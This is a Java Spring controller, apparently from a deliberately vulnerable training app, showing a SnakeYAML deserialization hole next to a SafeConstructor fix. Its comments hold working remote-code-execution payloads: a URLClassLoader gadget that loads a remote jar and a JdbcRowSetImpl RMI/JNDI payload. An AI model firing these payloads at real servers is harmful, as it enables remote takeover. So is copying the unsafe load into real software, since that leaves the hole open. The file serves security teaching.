package com.madaha.codesecone.controller.AdvancedAttack.deserialize;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

@RestController
@RequestMapping("/Deserialize/yaml")
public class YamlLoadVul {
    Logger log = LoggerFactory.getLogger(YamlLoadVul.class);

    /**
     * @poc(需要url编码，才能执行成功。) http://127.0.0.1:28888/RCE/yaml/vul?content=!!javax.script.ScriptEngineManager%20%5B!!java.net.URLClassLoader%20%5B%5B!!java.net.URL%20%5B%22http://127.0.0.1:8000/yaml-payload.jar%22%5D%5D%5D%5D
     * @poc_decode http://127.0.0.1:28888/Deserialize/yaml/content=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:8000/yaml-payload.jar"]]]]
     *
     * @payload_未测试：  content=!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'rmi://127.0.0.1:2222/exp', autoCommit: true}
     * @payload   content=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:8000/yaml-payload.jar"]]]]
     */

    @RequestMapping("/vul")
    public void vul(String content) {
        Yaml y = new Yaml();
        y.load(content);
        log.info("[vul] SnakeYaml反序列化： " + content);
    }

    public void safe(String content){
        // SafeConstructor 是 SnakeYaml 提供的一个安全的构造器。它可以用来构造安全的对象，避免反序列化漏洞的发生。
        try{
            Yaml y = new Yaml(new SafeConstructor());
            y.load(content);
            log.info("[safe] SnakeYaml反序列化： " + content);
        }catch (Exception e){
            log.warn("[error] SnakeYaml反序列化事变", e);
        }
    }










}
